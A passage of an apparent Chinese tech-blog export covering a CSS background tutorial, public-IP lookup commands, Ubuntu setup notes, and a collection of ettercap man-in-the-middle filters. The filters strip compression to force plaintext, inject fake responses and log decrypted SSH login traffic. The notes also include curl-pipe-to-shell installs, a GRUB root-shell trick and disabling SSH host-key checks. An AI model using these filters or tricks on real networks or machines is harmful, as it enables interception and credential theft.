/\n        background-size: cover;\n      \n        / 设置背景颜色，背景图加载过程中会显示背景色 /\n        background-color: #464646;\n        }\n\n上面最重要的一条就是：\n\n    background-size: cover;\n\n这样浏览器就会按比例缩放背景图直至背景图宽高不小于容器的宽高（在上面的例子中，就是body标签）。\n\n这里需要注意的一点就是：如果背景图小于body标签的尺寸（例如在高分辨率显示器上，或页面内容特别多时），浏览器会拉伸图片。我们都知道，当把一个图片拉伸时，图片会变模糊。\n\n因此，在选择背景图时，要特别注意尺寸。为了照顾到大尺寸屏幕，demo里用的图片尺寸为5498px  3615px 。\n\n同时，为了让背景图始终相对于viewport居中，我们声明了：\n\n    background-position: center center;\n    \n上面的规则会把背景图缩放的原点定位到viewport的中心。\n\n接下来我们需要解决的问题是：当内容的高度大于viewport的高度时，会出现滚动条。我们希望背景图始终相对于viewport固定，即使用户滚动时也是一样。\n\n解决办法就是：\n\n    background-attachment: fixed;\n\n(可选)使用媒体查询应对小屏幕\n\n为了应对小屏幕，我用photoshop将背景图按比例缩放到768px * 505px，然后通过smush.it 压缩图片体积。这样就将图片体积从1741KB降到114KB，节省了93%。\n\n下面是媒体查询的写法：\n\n    @media only screen and (max-width: 767px) {\n      body {\n        background-image: url(images/background-photo-mobile-devices.jpg);\n      }\n    }\n\n上面的媒体查询将max-width: 767px 设为断点，也就是说当浏览器viewport大于767px时，会使用大背景图，反之使用小背景图。\n\n使用上面媒体查询不利的一面是，如果你把浏览器窗口从1200px缩小到640px(反之亦然)，你会看到一个短暂的闪烁，因为小背景图或大背景图正在加载。\n\n译文到此结束。原文地址http://sixrevisions.com/css/responsive-background-image/\n\nps:\n由于IE8及其以前的浏览器不支持background-size:cover(查看兼容性),所以要支持这些老古董，还需要多做一些。\n\n要让IE8支持background-size,可以用background-size-polyfill","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/os_exec","title":"golang中os/exec包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 etterfilter","title":"etterfilter","text":"收集的一些Etterfilter\n\nBelow is a filter that Zaps the encoding to force plain-text communication:\n\nif (ip.proto == TCP \u0026\u0026 tcp.dst == 80) {\nif (search(DATA.data, “gzip”)) {\nreplace(“gzip”, ” “); # note: four spaces in the replacement string\nmsg(“whited out gzip\\n”);\n}\n}\n\nif (ip.proto == TCP \u0026\u0026 tcp.dst == 80) {\nif (search(DATA.data, “deflate”)) {\nreplace(“deflate”, ” “); # note: seven spaces in the replacement string\nmsg(“whited out deflate\\n”);\n}\n}\n\nReplacing text in a packet:\nif (ip.proto == TCP \u0026\u0026 search(DATA.data, “lol”)){\nreplace(“lol”, “smh”);\nmsg(“filter ran”);\n\n}\n\nDisplay a message if the tcp port is 22:\nif (ip.proto == TCP) {\nif (tcp.src == 22 || tcp.dst == 22) {\nmsg(“SSH packet\\n”);\n}\n}\n\nLog all telnet traffic, also execute ./program on every packet:\nif (ip.proto == TCP) {\nif (tcp.src == 23 || tcp.dst == 23) {\nlog(DATA.data, “./logfile.log”);\nexec(“./program”);\n}\n}\n\nLog all traffic except http:\nif (ip.proto == TCP \u0026\u0026 tcp.src != 80 \u0026\u0026 tcp.dst != 80) {\nlog(DATA.data, “./logfile.log”);\n}\n\nSome operation on the payload of the packet:\nif ( DATA.data + 20 == 0x4142 ) {\nDATA.data + 20 = 0x4243;\n} else {\nDATA.data = “modified”;\nDATA.data + 20 = 0x4445;\n}\n\nDrop any packet containing “ettercap”:\nif (search(DECODED.data, “ettercap”)) {\nmsg(“some one is talking about us…\\n”);\ndrop();\nkill();\n}\n\nLog ssh decrypted packets matching the regexp\nif (ip.proto == TCP) {\nif (tcp.src == 22 || tcp.dst == 22) {\nif (regex(DECODED.data, “.login.”)) {\nlog(DECODED.data, “./decryptedlog”);\n}\n}\n}\n\nDying packets:\nif (ip.ttl \nmsg(“The packet will die soon\\n”);\n}\n\nString comparison at a given offset:\nif (DATA.data + 40 == “ette”) {\nlog(DATA.data, “./logfile”);\n}\n\nInject a file after a specific packet:\nif (tcp.src == 21 \u0026\u0026 search(DATA.data, “root”)) {\ninject(“./fakeresponse”);\n}\n\nReplace the entire packet with another:\nif (tcp.src == 23 \u0026\u0026 search(DATA.data, “microsoft”)) {\ndrop();\ninject(“./fake_telnet”);\n}\n\nFilter only a specific ip address:\nif (ip.src == ‘192.168.0.2’) {\ndrop();\n}\n\nTranslate the port of the tcp packet from 80 to 81:\nif (tcp.dst == 80) {\ntcp.dst -= 1;\ntcp.dst += 2;\n}\n\n参考\nmore-on-ettercap-plus-filter-examples.\nhttp://aerokid240.blogspot.com/2009/11/more-on-ettercap-plus-filter-examples.html\n\nXssf Inject with ettercap and Arp PoisoningClsHack\nhttp://m.blog.csdn.net/article/details?id=7494769\n\n中间人攻击之ettercap嗅探\nhttp://www.s0nnet.com/archives/mitm-ettercap","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux字符集(locale)设置","title":"How to Set Locales (i18n) On a Linux or Unix","text":"---\n各种字符集和编码详解 - 快乐就好 - 博客园\n十分钟搞清字符集和字符编码 - 文章 - 伯乐在线\nunicode wiki\n编码\nman -k unicode\nascii\n\n转义字符串（Escape Sequence）也称字符实体(Character Entity)。在HTML中，定义转义字符串的原因有两个：第一个原因是像“”和“”这类符号已经用来表示HTML标签，因此就不能直接当做文本中的符号来使用。为了在HTML文档中使用这些符号，就需要定义它的转义字符串。当解释程序遇到这类字符串时就把它解释为真实的字符。在输入转义字符串时，要严格遵守字母大小写的规则。第二个原因是，有些字符在ASCII字符集中没有定义，因此需要使用转义字符串来表\n\njs中的escape的用法汇总\n\nescape对0-255以外的unicode值进行编码时输出%u***格式，其它情况下escape，encodeURI，encodeURIComponent编码结果相同。\n最多使用的应为encodeURIComponent，它是将中文、韩文等特殊字符转换成utf-8格式的url编码，所以如果给后台传递参数需要使用encodeURIComponent时需要后台解码对utf-8支持（form中的编码方式和当前页面编码方式相同）\nescape不编码字符有69个：，+，-，.，/，@，，0-9，a-z，A-Z\nencodeURI不编码字符有82个：!，，$，\u0026，'，(，)，，+，,，-，.，/，:，;，=，?，@，，~，0-9，a-z，A-Z\nencodeURIComponent不编码字符有71个：!， '，(，)，，-，.，，~，0-9，a-z，A-Z\n\nescape(str) 方法，它用于转义不能用明文正确发送的任何字符。比如，电话号码中的空格将被转换成字符 %20，从而能够在 URL 中传递这些字符\n\nescape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值。比如\"春节\"的返回结果是%u6625%u8282，，escape()不对\"+\"编码\n主要用于汉字编码，现在已经不提倡使用。\n\nencodeURI()是Javascript中真正用来对URL编码的函数。\n编码整个url地址，但对特殊含义的符号\"; / ? : @ \u0026 = + $ , #\"，也不进行编码。对应的解码函数是：decodeURI()。\n\nencodeURIComponent()\n能编码\"; / ? : @ \u0026 = + $ , #\"这些特殊字符。对应的解码函数是decodeURIComponent()。\n\n我想要传递带\u0026符号的网址，所以用encodeURIComponent()\n\nurl 编码 [形式为 %20] 字符集可能是utf8 肯能是gbk\n\nRFC1738 统一资源定位器(URL)\n“只有字母和数字[0-9a-zA-Z]、一些特殊符号“$-.+!'(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。”\n2．2  URL字符编码问题\n\n如果存在下面的情况：八位字节数在US-ASCII字符集中没有相应的可显示字符，或者使\n用相应字符会产生不安全因素，或者相应的字符被保留用于特定的URL方案的解释，那\n么它们必须被编成代码。\n没有相应的可显示字符：\nURL只能用US-ASCII字符编码集中的可显示字符表示。US-ASCII中没有用到十六进制的\n八位字节80-FF，并且00－1F和7F代表了控制字符，这些字符必须进行编码。\n不安全：\n字符不安全的原因很多。空格字符就是不安全的，因为URL在被转录或者被排版或者被\n字处理程序处理后其中重要的空格可能被忽略，而可忽略的空格却有可能被解释了。“\u003c”\n和“  ”字符也是不安全的，因为它们被用来作为URL在文本中的分隔符；而在有些系统\n中用引号“\"”来界定URL。“#”字符也是不安全的，因为它在万维网和其他一些系统中\n被用来从“片段/锚点”标志符中界定URL，所以它通常都要被编码。字符“%”被用来对\n其他字符进行编码，它也是不安全的。其他一些字符，如：\n\"{\", \"}\", \"|\", \"\\\", \"^\", \"~\",\"[\", \"]\",和\"`\"\n，由于网关和其他传输代理有时会对这些字符进行修改，所以它们也是不安全的。\n必须对URL中所有不安全的字符进行编码。例如，URL中的字符“#”即使是在通常不处\n理片断或者锚点标志符的系统也需要进行编码，这样如果这个URL被拷贝到使用这些标\n志符的系统中，也不必改变URL编码了。\n保留：\n许多URL方案保留了一些字符并赋予特定的含义：它们出现在URL的特定部位并表示特\n定的含义。如果一个字符对应的八位字节在方案中被保留了，那么这个八位字节必须进行\n编码。字符\";\",\"/\", \"?\", \":\", \"@\", \"=\" 和 \"\u0026\"可能被某个方案所保留，除此之外没\n有其他的保留字符。\n通常情况下一个八位字节被用一个字符表示后或者被编码之后，URL的解释都是一样的。\n但这对于保留字符来说就不适用了：对某一特定方案的保留字符进行编码可能会改变URL\n的语义。\n这样，在URL中只有字母与数字，以及特殊字符“$-.+!'(),”和用作保留目的的保留\n字符可以不进行编码。\n另一方面，不必进行编码的字符（包括字母与数字）如果出现在URL的特定部位，只要\n它们不用作保留目的，则可进行编码。\n\nhtmlentity_decode\n那么HTML Entity编码具体应该做哪些事情呢？它需要对下面这6个特殊字符进行编码：\nHTML字符实体(Character Entities)\n\n有些字符在HTML里有特别的含义，比如小于号\u003c就表示HTML Tag的开始，这个小于号是不显示在我们最终看到的网页里的。那如果我们希望在网页中显示一个小于号，该怎么办呢？\n\n这就要说到HTML字符实体(HTML Character Entities)了。\n\n一个字符实体(Character Entity)分成三部分：第一部分是一个\u0026符号，英文叫ampersand；第二部分是实体(Entity)名字或者是#加上实体(Entity)编号；第三部分是一个分号。\n\n比如，要显示小于号，就可以写\u0026lt;或者\u0026#60;。\n\n用实体(Entity)名字的好处是比较好理解，一看lt，大概就猜出是less than的意思，但是其劣势在于并不是所有的浏览器都支持最新的Entity名字。而实体(Entity)编号，各种浏览器都能处理。\n\n注意：Entity是区分大小写的。\n\n如何显示空格\n\n通常情况下，HTML会自动截去多余的空格。不管你加多少空格，都被看做一个空格。比如你在两个字之间加了10个空格，HTML会截去9个空格，只保留一个。为了在网页中增加空格，你可以使用\u0026nbsp;表示空格。\n\n最常用的字符实体(Character Entities)\n\n显示结果    说明    Entity Name    Entity Number    \n\n显示一个空格    \u0026nbsp;    \u0026#160;    \n\u003c    小于    \u0026lt;    \u0026#60;    \n  大于    \u0026gt;    \u0026#62;    \n\u0026    \u0026符号    \u0026amp;    \u0026#38;    \n\"    双引号    \u0026quot;    \u0026#34;    \n\n其他常用的字符实体(Character Entities)\n\n显示结果    说明    Entity Name    Entity Number    \n\n©    版权    \u0026copy;    \u0026#169;    \n®    注册商标    \u0026reg;    \u0026#174;\n×    乘号    \u0026times;    \u0026#215;\n÷    除号    \u0026divide;    \u0026#247;   \n`","tags":null},{"location":"//blog.pytool.com/Linux/2017-10-26 Linux获取本机IP","title":"Linux获取本机IP","text":"curl http://members.3322.org/dyndns/getip  \ncurl ip.6655.com/ip.aspx  \ncurl ifconfig.me  \ncurl icanhazip.com  \ncurl ident.me  \ncurl ipecho.net/plain  \ncurl whatismyip.akamai.com  \ncurl myip.dnsomatic.com  \n\n更多用法访问ifconfig.co  \nwget -qO - ifconfig.co  \n\n返回IP和地区  \ncurl ip.6655.com/ip.aspx?area=1  \ncurl cip.cc","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 Ubuntu常见问题","title":"Ubuntu常见问题","text":"---\npython -m SimpleHTTPServer 4000\naxel -n 10 -o /tmp/ http://soft.vpser.net/lnmp/lnmp0.7-full.tar.gz\nubuntu最新镜像\n\n开机自启动\n 方法一：设置开机自动启动\nvi ~/.config/upstart/firefox.conf\nstart on desktop-start  \nstop on desktop-end  \nexec /usr/bin/firefox\n 方法二：设置开机自动启动\nmkdir -p ~/.config/autostart\ncp /usr/share/applications/firefox.desktop ~/.config/autostart/firefox.desktop\nchmod +x ~/.config/autostart/firefox.desktop\n方法三：Startup Applications 添加\n\n ubuntu 系统优化\n添加/移除更新源\n\nsudo apt-add-repository 'deb https://dl.bintray.com/go-swagger/goswagger-debian ubuntu main'\nsudo apt-add-repository -r 'deb https://dl.bintray.com/go-swagger/goswagger-debian ubuntu main'\n 1.编辑更新源\n\napt edit-sources  等价 vi /etc/apt/sources.list\n\ncat /etc/apt/sources.list.d/.list #查看所有更新源\n\napt-add-repository 'deb http://myserver/path/to/repo stable myrepo'\napt-add-repository 'http://myserver/path/to/repo myrepo'\napt-add-repository 'https://packages.medibuntu.org free non-free'\napt-add-repository http://extras.ubuntu.com/ubuntu\napt-add-repository ppa:user/repository\napt-add-repository ppa:user/distro/repository\napt-add-repository multiverse\n\n切换 更新源aliyun\n\nsed -i \"s/archive.ubuntu/mirrors.aliyun/g\" /etc/apt/sources.list\n// sed -i \"s/security.ubuntu/mirrors.aliyun/g\" /etc/apt/sources.list\n\nsudo sed -i 's/archive.ubuntu.com/mirrors.sohu.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.163.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list\nsudo sed -i 's/archive.ubuntu.com/mirrors.aliyuncs.com/g' /etc/apt/sources.list 内网使用\n\nUbuntu ctrl+alt+b快捷键冲突\n安装了搜狗拼音后，其快捷键ctrl+alt+b会启动软键盘，造成与其他编辑器快捷键的冲突。\n为了禁止使用ctrl+alt+b启动软键盘，可以：fcitx设置，选择Addon选项卡，高级 取消选择虚拟键盘\n\nGWF\nwget -qO /etc/hosts https://raw.githubusercontent.com/racaljk/hosts/master/hosts\n让cd对大小写不敏感\necho bind \\\"set completion-ignore-case on\\\"     ~/.bashrc\n ubuntu 14 系统精简\nsudo apt-get -y purge firefox firefox\nsudo apt-get -y purge empathy #即时通讯\nsudo apt-get -y purge libreoffice- #办公套件\nsudo apt-get -y purge unity-webapps-common #Amazon\nsudo apt-get -y purge deja-dup #备份\nsudo apt-get -y purge webbrowser-app #浏览器\nsudo apt-get -y purge unity-scope-gdrive\nsudo apt-get -y purge unity-lens-photos\nsudo apt-get -y purge landscape-client-ui-install #landscape 服务\nsudo apt-get -y purge transmission-gtk #Transmission BitTorrent\nsudo apt-get -y purge rhythmbox #音乐播放\nsudo apt-get -y purge wodim #命令刻碟\nsudo apt-get -y purge brasero #光盘刻录\nsudo apt-get -y purge gnome-orca #屏幕阅读\nsudo apt-get -y purge ubiquity #安装 RELEASE\nsudo apt-get -y purge totem #视频\nsudo apt-get -y purge cheese #茄子\nsudo apt-get -y purge aisleriot #纸牌王\nsudo apt-get -y purge gnome-mines #扫雷\nsudo apt-get -y purge gnome-sudoku #数独\nsudo apt-get -y purge gnome-mahjongg #对对碰\nsudo apt-get -y autoremove\n\nsudo apt-get update\nsudo apt-get -y dist-upgrade\nsudo apt-get -y upgrade\nsudo apt-get autoclean\nsudo apt-get dist-upgrade --fix-missing\n\n我用了搜狗输入法。\n卸载了ibus然后装了fcitx，再装了搜狗。\n记得一定要启动\nsogou-qimpanel \u0026\n/usr/bin/fcitx \u0026\nubuntu server\n docker-engine\ncurl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -\ncurl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/intranet | sh -\ndocker-compose\ncurl -L https://github.com/docker/compose/releases/download/1.8.0/docker-compose-uname -s-uname -m   /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-machine\n zip\napt install unzip\nubuntu 14 必备软件\n\nterminal\nsudo apt-get install nautilus-open-terminal\ngit\nsudo apt-get install git\nvim\nsudo apt-get -y install vim\nchromium-browser\nsudo apt-get -y install chromium-browser\nsudo apt install adobe-flashplugin\n\nfirefox Shockwave Flash\nsudo apt-get install flashplugin-installer\nwireshark\nsudo apt install wireshark\n\nhttps://launchpad.net/ubuntu/+ppas\n\nhttp://www.ubuntuupdates.org\n\nsudo add-apt-repository -y ppa:webupd8team/java\nsudo apt-add-repository --remove ppa:webupd8team/java\nsudo add-apt-repository -y ppa:zeal-developers/ppa \t#zeal\nsudo add-apt-repository -y ppa:ubuntu-elisp/ppa\t\t\t#emacs\nsudo add-apt-repository -y ppa:neovim-ppa/unstable\t#neovim\nsudo add-apt-repository -y ppa:webupd8team/sublime-text-3\nsudo add-apt-repository -y ppa:webupd8team/tor-browser\n\nhttps://launchpad.net/~docker\n\nsudo add-apt-repository -y ppa:docker/experimental         #docker\n\nhttps://launchpad.net/~nginx\n\nsudo add-apt-repository -y ppa:nginx/development #nginx ppa:nginx/stable\nsudo add-apt-repository -y ppa:dreibh/ppa #wireshark\n\nhttps://launchpad.net/~backbox\n\nsudo add-apt-repository -y ppa:backbox/four #黑客工具\n\nsudo add-apt-repository --remove ppa:webupd8team\n\nkali /etc/apt/sources.list\n\ndeb http://http.kali.org/kali kali-rolling main contrib non-free\n\nFor source package access, uncomment the following line\n\ndeb-src http://http.kali.org/kali kali-rolling main contrib non-free\n\nsudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6\n\n软件安装\nxx-net\n  sudo apt-get install python-openssl\n\natom\n  sudo add-apt-repository -y ppa:webupd8team/atom\n  sudo apt-add-repository --remove  ppa:webupd8team/atom\n  curl -Lxk 127.0.0.1:8087 https://atom-installer.github.com/v1.16.0/atom-amd64.deb -O\n\ngo   \n   curl -O https://storage.googleapis.com/golang/go1.8.1.linux-amd64.tar.gz\n      sudo tar -zxf go1.8.1.linux-amd64.tar.gz -C /usr/local \n\npandoc\n  sudo apt install pandoc\n\ntypora\n\n  sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE\n  sudo add-apt-repository 'deb http://typora.io linux/'\n  sudo add-apt-repository -r 'deb http://typora.io linux/'    移除\n  sudo apt-get install typora\n\ndocker\ncurl -sSL https://get.docker.com/ | sh\nsudo gpasswd -a ${USER} docker\nsudo docker login\nsudo docker pull node\ndocker run -it -p 80:4000 -v /media/ubuntu/software/rinetd:/blog emitting/hexo /bin/bash\n\nxx-net\ngit clone https://github.com/XX-net/XX-Net ~/XX-Net\n\nsudo apt-get -y install libnss3-tools\n\nsudo apt-get -y install python-openssl\n\nsudo apt-get -y install libffi-dev\n\nsudo apt-get -y install python-gtk2\n\nsudo apt-get -y install python-vte\n\nhexo\ncurl -sL https://deb.nodesource.com/setup5.x | sudo -E bash -\nsudo apt-get install -y nodejs\nsudo apt-get install -y build-essential gyp ERR! build error\nsudo npm -y install hexo -g\n\nsudo npm -y install cnpm -g\nsudo ln -sf /usr/bin/nodejs /usr/bin/node\nnpm config set proxy http://localhost:port\nnpm config set https-proxy http://localhost:port\nnpm config set registry http://registry.npm.taobao.org/\nnpm config set registry http://registry.cnpmjs.org\n\n字体相关目录\n字体下载\n字体口袋\nsudo fc-cache -fv\n/usr/share/fonts/ \t\t系统默认字体目录\n/usr/local/share/fonts\t#空\n~/.local/share/fonts \t#安装字体目录\n~/.fonts\t\t\t\t\t\t\t\t#空\n​Source Code Pro\nDejaVu Sans Mono\nInconsolata\n\n开机显示按S跳过按M手动修复\n\n终端下输入sudo blkid,然后对比uuid,将fstab中的uuid修改为正确的，这种情况多见于双系统，后来又格式化分区造成uuid改变了\n\n我修改了，我的/etc/fstab文件，与blkid显示的uuid号一样，开机硬盘挂载就正常了。\n\n 自启动管理\nalt+f2 #打开运行命令\ngnome-session-properties\n解决输入法fcitx无法启动\n删除~/.config/目录下的fcitx相关目录\n 系统修复\nrm -rf .gconf\nsudo: 无法解析主机：xenial\nsudo gedit /etc/hosts\n\t127.0.0.1\txenial\n 最重要的快捷键\nCtrl + Alt + T 打开终端\ndpkg：警告：无法找到软件包 XXXX 问题解决\nsudo apt-get --fix-missing --reinstall install dpkg --get-selections | grep '[[:space:]]install' | cut -f1\n 禁用错误报告\nsudo gedit /etc/default/apport\nenabled=0\nsudo service apport\n创建桌面快捷方式\nsudo nautilus\n进入\n/usr/share/applications\n把需要的图标，也就是desktop文件复制到桌面上。\n\n Linux将中文目录名改为英文\nexport LANG=enUS\nxdg-user-dirs-gtk-update\nexport LANG=zhCN.UTF-8\nvim ~/.config/user-dirs.dirs\nUbuntu 15.04双击运行 .sh、.py文件\n任意打开一个文件夹，选择左上角的  ”编辑——首选项“\n首选项中切换到行为选项卡，把“可执行文本文件”中的选项“打开可执行文本文件时查看其内容”，改选为“打开可执行文本文件时运行它们”；\n\n 【VirtualBox】vboxclient the virtualbox kernel service is not running. exiting.\n\tsudo /etc/init.d/vboxdrv setup\n\tsudo /etc/init.d/vboxadd setup\nNetwork service discovery disabled\nsudo -i\ngedit /etc/default/avahi-daemon\nAVAHIDAEMONDETECTLOCAL=0\n  win10 ubuntu16.04 双系统 时间不一致问题解决办法\n\t问题原因是使用的时间不一致导致的。win10直接从bios读出来的时间认为就是实际时间，ubuntu认为加上8个小时 后的才是。win10用的rtc ，ubuntu用的utc\ntimedatectl set-local-rtc true\n关闭UTC时间\nsudo timedatectl set-local-rtc 1\n\n1 - 硬件时钟使用 UTC\n\ntimedatectl set-local-rtc 0\ntimedatectl set-ntp 1\n\n2 - 硬件时钟使用本地时间\n\ntimedatectl set-local-rtc 1 --adjust-system-clock\ntimedatectl set-ntp 0\n 通过改变内核启动参数获得root权限\n　　启动电脑，等待GRUB菜单，如果GRUB菜单隐藏，可以按Esc调出，如果设置了GRUB密码，按p来解锁，比如我们选择了 Ubuntu, kernel 2.6.12-8-386，按e在启动前编辑启动参数，选择kernel /boot/vmlinuz-2.6.12-8-386 root=/dev/hda2 ro quiet splash，按e编辑选定的启动菜单项，在参数最后添加rw init=/bin/bash，即改为如下命令行：\n　　grub edit  kernel /boot/vmlinuz-2.6.12-8-386 root=/dev/hda2 ro quiet splash rw init=/bin/bash\n　　按b启动即可。\n解决Ubuntu不能挂载ntfs格式硬盘 只读\nsudo ntfsfix /dev/sdb2\n\nsudo ntfs-3g /dev/sda2 /windows\n\nThe disk contains an unclean file system (0, 0).\nMetadata kept in Windows cache, refused to mount.\nFalling back to read-only mount because the NTFS partition is in an\nunsafe state. Please resume and shutdown Windows fully (no hibernation\nor fast restarting.)\n\n 使用dd来备份还原mbr,分区表\n备份和还原MBR文件：\ndd if=/dev/sda of=/mnt/usb/mbr.backup bs=512 count=1\ndd if=/mnt/usb/mbr.backup of=/dev/sda bs=512 count=1\n\n别用512会丢分区的\ndd if=/dev/hda of=/mbr.bak bs=446 count=1\n修复windows在grub2下的引导\nsudo update-grub2\n 系统安装\nsudo umount -l /isodevice\nsudo umount -l /cdrom\t不要执行 否则无法添加ubuntu引导\n\n/boot/grub/grub.cfg \t系统根据“/etc/grub.d”和“/etc/default/grub”自动生成的文件\n  /etc/grub.d/ \t\t\t系统生成文件夹\n    /etc/default/grub 用户配置文件 通过sudo update-grub2 重新生/boot/grub/grub.cfg\n      “GRUBDEFAULT=0”就是设置的默认启动项了\n      GRUB启动项是按照启动菜单依次使用数字进行索引了，起始数字为0。结合前面的系统启动菜单，我们可以看到，\n      Windows8的启动项在第5项，因此这里我们就需要修改为4\n\nunetbtin\nmenuentry 'Ubuntu 14.04 LiveCD' {\nset root=(hd0,2) vmlinuz和initrd.gz文件所在的分区\nlinux /vmlinuz.efi boot=casper iso-scan/filename=/ubuntu-14.04.4-desktop-amd64.iso splash locale=zhCN.UTF-8\ninitrd /initrd.lz\n}\n\neasyBCD\ntitle Install Ubuntu\nroot (hd0,1)\nkernel /vmlinuz.efi boot=casper iso-scan/filename=/ubuntu-15.10-desktop-amd64.iso ro quiet splash locale=zhCN.UTF-8\ninitrd /initrd.lz\n\n 修复Win10 引导Grub-Customizer\nsudo add-apt-repository ppa:yannUbuntu/boot-repair \u0026\u0026 sudo apt-get update\nsudo apt-get install -y boot-repair \u0026\u0026 boot-repair\n\nsudo add-apt-repository ppa:danielrichter2007/grub-customizer\nsudo apt-get update\nsudo apt-get install grub-customizer\nsudo apt-get remove grub-customizer\n移除PPA命令：\nsudo apt-get install ppa-purge\nsudo ppa-purge ppa:danielrichter2007/grub-customizer\n\n移动home和让ubuntu拥有分身的技术。 主要参考了这个网站 。\n\n新开一个分区，格式化为ext4格式。\n将你的home目录复制过去。建议用root账户操作：\n\nsu sudo cp -afrv /home/ /media/wanze/data\n\n这里建议使用 gparted 分区工具将分区的卷标加号，比如上面我加上了data卷标，然后挂载就成了/media/wanze/data的地址，当然你也可以用ubuntu的文件浏览器设置那里选择输入位置，那个位置你复制了就是的。 上面选项加上v就是为了防止你出现系统卡死的错觉。。\n\n复制的时候你可以开始修改/etc/fstab文件。我之前没有/home设置，所以需要重新加上这样一句：\n  home was on /dev/sda6 during installation\nUUID=e56f656e-8ebb-4ab8-8f76-c1e26aba22a4  /home ext4 defaults 0 0\n上面的UUID也就是你新分区的那个UUID，通过命令：\n\nls -l /dev/disk/by-uuid\n查看。日期时间后面那个就是，然后设置/home挂载点，其他就是defaults 0 0 0了。\n\n稳妥起见，我发现复制完了新的wanze文件夹权限不一样了，用sudo nautilus 修改下权限，和你之前的一模一样就行了。\n重启，发现简直一模一样，包括网络硬盘同步程序等等都没出错。\n将fstab那一句注释掉，重启，发现又进入原来的wanze主目录了。然后将不重要的音乐，下载的文件图片等，因为重复了，所以删除掉节省点根目录的空间。\n将fstab那句不注释，发现又进入新的主目录文件夹了。这样就感觉有了两个系统，毕竟个人电脑用户出错就出错在home文件夹里面的设置上，这样算是有了双保险了把。\n在ubuntu下删除ntfs分区的休眠文件\n这个问题是windows休眠了，然后不知怎么出错了然后就进入不了windows系统了。这个时候windows系统还是有救的。如果你装了双系统的话，进入ubuntu系统，删除掉ntfs分区的休眠文件即可。参考了 这个网页 。\n\nsudo mount -t ntfs-3g -o removehiberfile /dev/sda5  具体挂载的位置\n这个命令其实就是mount命令，然后加上了 -o removehiberfile 。后面的第一个参数是待加载项，这里应该是你的win7安装的目标ntfs分区，可用 sudo fdisk -l 查看一下。然后具体挂载的位置随意:\n\nsudo mkdir /media/wanze/D\nsudo mount  /dev/sda5 /media/wanze/D\n在ubuntu下通过ISO文件硬盘安装win7系统\n用gparter分区\n先mount\n把文件复制到d盘\n执行 sudo update-grub\n重启到新加入的那个恢复模式下即可﻿\n linux修改键盘映射capslock为ctrl\nsudo apt-get install xmodmap\nsudo apt-get install x11-xserver-utils\n\n在自己的工作目录home里新建一个.xmodmaprc的文件\nvim .xmodmaprc\nremove Lock = CapsLock\nremove Control = ControlR\nkeysym ControlR = CapsLock\nkeysym CapsLock = ControlR\nadd Lock = CapsLock\nadd Control = ControlR\n执行\nxmodmap .xmodmaprc\n/bin/bash -c \"sleep 20; /usr/bin/xmodmap /home/$USER/.Xmodmap\"\nfcitx-xkb覆盖掉了xmodmap，把xkb禁用就好了\nsetxkbmap -option ctrl:swapcaps\nman xkeyboard-config\nsudo vi /etc/default/keyboard\n找到“XKBOPTIONS”，加入“ctrl:swapcaps”来交换Caps Lock和Control键。如果还要加入其他的选项，中间可以用英文逗号隔开。\n\nXKBOPTIONS=\"ctrl:nocaps\"\n\n最后需要执行\n\nsudo dpkg-reconfigure keyboard-configuration\n\n这样修改以后，图形界面和虚拟终端下（例如Ctrl+Alt+F1）都可以起作用。而通过gnome-tweak-tool修改的只能在图形界面下起作用。\n\ndocker\ncurl -sSL https://get.docker.com/ | sh\nhttp://openvz.org/Download/templates/precreated\n\nsudo docker pull ubuntu:15.10\nsudo docker pull learn/tutorial\ndocker images\ndocker ps\n\n文件监控 DaemonFS\n磁盘 gnome-disks\n磁盘使用情况分析器 baobab\n安装主题\nubuntu15.10install-mac-theme\nsudo add-apt-repository ppa:noobslab/icons\nsudo apt-get update\nsudo apt-get upgrade\n导入公钥:\nsudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 6AF0E1940624A220\n\nsudo apt-get install ultra-flat-icons\n\tmac 主题\nsudo add-apt-repository ppa:noobslab/themes\nsudo apt-get update\nsudo apt-get install macbuntu-bscreen-v6\nsudo apt-get install macbuntu-icons-v6\nsudo apt-get install macbuntu-ithemes-v6\nsudo apt-get install macbuntu-lightdm-v6\nsudo apt-get install macbuntu-plank-theme-v6\n\nsudo apt-get install docky\n\n  安装Chromium并添加Pepper Flash Player\nsudo apt-get update sudo apt-get install chromium-browser\nsudo apt-get install pepperflashplugin-nonfree\nsudo update-pepperflashplugin-nonfree --install\n安装搜狗输入法\nhttp://jingyan.baidu.com/article/ad310e80ae6d971849f49ed3.html\n\n 安装corkscrew\nsudo apt-get install corkscrew\nvi ~/.corkscrew-auth\n加入useraname:password   代理服务器使用的用户名密码\n比如：Aubby：123456\nvi ~/.ssh/config\nHost 192.168.0.                                \\\\远程目标主机网段\nControlPersist 4h \\\\长连接，防止自动断开连接\n         User Aubby  \\\\登陆远程主机不需要再加用户名\nProxyCommand corkscrew HTTP代理IP HTTP代理端口 %h %p ~/.corkscrew-auth\nHost  172.168.10.1 172.168.10.2                 \\\\针对多个代理多个主机\nControlPersist 4h\n User Aubby\n       ProxyCommand corkscrew HTTP代理IP HTTP代理端口 %h %p ~/.corkscrew-auth\nssh 192.168.0.1\nssh 172.168.10.1 测试 则都可成功\n16条技巧让你更高效使用ssh\n\n 在任务栏显示网速\nsudo add-apt-repository ppa:nilarimogard/webupd8\nsudo apt-get update\nsudo apt-get install indicator-netspeed\n\nssh忽略knownhosts\nmkdir -p ~/.ssh\necho -e \"StrictHostKeyChecking no\\nUserKnownHostsFile /dev/null\"   